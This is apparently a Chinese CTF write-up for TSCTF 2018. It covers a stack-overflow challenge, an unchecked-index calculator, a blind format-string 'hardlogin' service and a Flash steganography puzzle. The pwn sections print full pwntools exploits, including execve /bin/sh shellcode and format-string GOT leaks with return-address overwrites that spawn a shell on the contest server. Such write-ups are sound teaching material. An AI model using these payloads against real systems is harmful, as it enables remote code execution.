# TSCTF 2018 Write up

## PWN1

这道题从ida里可以看到buff存在溢出，可以覆盖掉v3(存储金额的变量)以及main函数返回值。而且题目主动泄露了buff所在的地址。

检查文件的保护机制：

```shell
	Arch:     i386-32-little
	RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

什么都没开 :D

于是就可以覆盖掉返回值，执行放在栈上的shellcode。由于覆盖返回值难免会覆盖掉v3所以就在第二次读入的时候放入shellcode，shellcode的地址可以直接用泄露出来的地址。

给大佬献上exp：

```python
from pwn import *
debug = 0

if debug:
	context.log_level='debug'
	p = process('./main')
	gdb.attach(p,'b *0x804868f')
else:
    p = remote('10.112.108.77',2333)

p.recvuntil('please input your name:')
p.sendline('vivi')
p.recvuntil('Hello vivi\n')
p.recvline()
r=p.recvline()
addr = int(r[25:32],16)
#print addr
p.recvline()
p.recvuntil('Do you want to change your name?(1(yes) or 2(no)):')
p.sendline('1            '+p32(addr))
p.recvuntil('you have enough money,please input your new name:')
p.send('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')
p.interactive()
```

## Easycalc

这道题刚扔进ida就看到了一个叫hackhere的函数，仔细一看是弹一个shell，那八成是将返回值覆盖为此函数地址了。查看main函数有一个change number的功能而且没有检查index的大小，可以通过这个来直接修改返回值。查看文件保护措施：

```shell
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

可以看到开了canary，但是应该只要不是异或型的就没关系。试了一下，发现的确没有检测到。

这道题没写exp，直接手输的index和number。

## Hardlogin

刚开始看到这道题还有一个web页面还以为是在逗我，没想到真的用上了hhh

首先这是一道blind pwn，想起来在tsctf新生赛的时候有一道easylogin很类似，于是就直接用了这道题的官方write up来dump二进制文件，然后放到ida里，发现有一个检查password，password是随机生成的，地址固定，可以直接通过格式化字符串读取。先用下面这个脚本看看执行 ls -al的效果。

```Python
from pwn import *
context.log_level='debug'

def leak(io):
    addr = 0x804a04c
    payload =  "%13$s|||" + p32(addr)
    io.sendlineafter('Username:',payload)
    data = io.recvuntil("|||").split("|||")[0].split("Hello ")[1]
	io.sendlineafter("Password:",data);
    io.recvall()

if __name__ == '__main__':
    ip = '10.112.108.77'
    port = 2336
    io = remote(ip,port)
    leak(io)
```

结果如下：

```shell
'total 1764\n'
    'drwxr-xr-x 2 root root          4096 May 23 16:29 .\n'
    'drwxr-xr-x 8 root root          4096 May 23 16:29 ..\n'
    '-rwxr-x--- 1 root hard_login      39 May 23 16:08 flag\n'
    '-rwxr-xr-x 1 root hard_login    7780 May 23 16:08 hard_login.bak\n'
    '-rwxr-xr-x 1 root root           289 May 23 16:08 index.html\n'
    '-rw-r--r-- 1 root root           612 May 23 16:29 index.nginx-debian.html\n'
```

看到index.html才知道原来是从web上下载二进制文件和libc呀。

下载完了之后开始天真地疯狂修改GOT表。。然后每次都是SIGSEGV，还以为是我写错了于是疯狂检查。直到查看保护机制：

```shell
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

这个full relro是什么鬼，查了之后发现是防止修改got表的(´ﾟдﾟ`)。。

所以还能想到的就是覆盖返回值了。将main函数返回值覆盖为system，然后在返回值所在地址加八的地方放入/bin/sh的地址。不过返回值所在地址需要先泄漏才可以。/bin/sh我是放在了username里面，但是具体哪个位置不会被之后的程序修改还需要自己试一下。整个exp逻辑如下，先泄漏printf地址，计算system地址；泄漏返回值地址；覆盖返回值地址；覆盖参数地址；放入参数以及通过password的check从而返回。

```python
from pwn import *
context.log_level='debug'
binary = ELF("./hard_login.bak")
printf_got = binary.got["printf"]
libc = ELF("./libc-2.23.so.bak")
#libc = ELF("/lib32/libc.so.6")
libc_sys = libc.symbols["system"]
libc_printf = libc.symbols["printf"]
libc_puts = libc.symbols["puts"]

def unsigned(n):
    return n & 0xFFFFFFFF

def leak(io):
    #----------------------------get sys addr----------------------
    length = 0
    addr = printf_got
    payload =  "%13$s|||" + p32(addr)
    io.sendlineafter('Username:',payload)
    data = io.recvuntil("|||").split("|||")[0].split("Hello ")[1]
    sys_addr = u32(data[0:4]) + libc_sys - libc_printf
    print hex(sys_addr)
    io.sendlineafter('Password:','xx')
    #----------------------------get ret addr----------------------
    payload = "%35$d|||"
    io.sendlineafter('Username:',payload)
    data = io.recvuntil("|||").split("|||")[0].split("Hello ")[1]
    data = unsigned(int(data))
    ret_addr = data + 0x34
    print ret_addr
    io.sendlineafter('Password:','xx')
    
    #----------------------------cover ret-------------------------
    payload = p32(ret_addr) + p32(ret_addr + 2) + "%" + str((sys_addr & 0x0000ffff) - 8 ) +"c%11$hn" + "%" + str(((sys_addr & 0xffff0000) >> 16) - (sys_addr & 0x0000ffff) + 65536) + "c%12$hn"
    io.sendlineafter('Username:',payload)
    io.sendlineafter('Password:','ll')

    sh_addr = ret_addr - 0xd0 + 36
    payload = p32(ret_addr + 8) + p32(ret_addr + 10) + "%" + str((sh_addr & 0x0000ffff) - 8 ) +"c%11$hn" + "%" + str(((sh_addr & 0xffff0000) >> 16) - (sh_addr & 0x0000ffff) + 65536) + "c%12$hn"
    io.sendlineafter('Username:',payload)
    io.sendlineafter('Password:','ll')
    #----------------------------retern----------------------------
    addr = 0x804a04c
    payload =  "%13$s|||" + p32(addr) + "ABCDEFGHIJKLMNOPQRSTUVWX/bin/sh"
    io.recvuntil('Username:')
    io.sendline(payload)
    data = io.recvuntil("|||").split("|||")[0].split("Hello ")[1]
    io.sendlineafter("Password:",data)
    io.interactive()
if __name__ == '__main__':
    ip = '10.112.108.77'
    port = 2336
    io = remote(ip,port)
    #io = process('./hard_login.bak')
    #gdb.attach(io,'b *0x80487FF')
    leak(io)
```

## Zhiyu的视频

首先在binwalk，strings无果之后，在网上查看到了一个swf[反编译的工具](https://www.52pojie.cn/thread-501799-1-1.html)，看到了flash在时间和空间上的隐藏，但是经过客服提醒这个并没有什么关系，然后hint里面提到了元件，所以就通过反编译工具查看元件部分的定义，看到有一个元件的定义部分出奇地大，本来以为隐藏了另一个文件，但是没有看到什么异样。然后偶然看到这个元件的图形，是一串string。猜测这串string解出来是得到数字的汉字。结合第三个hint，尝试更换不同的输入法，使用五笔输入法的时候，发现可以打出来数字，但是打印到七个汉字的时候出现了非数字，经过客服提示这应该是一句话，于是直接在百度搜索框输入，输入到一半这句话就出来了：一三五七八十腊，三十一天永不差。于是得到flag:TSCTF{13578101231}  //12不要落下(ㆆᴗㆆ)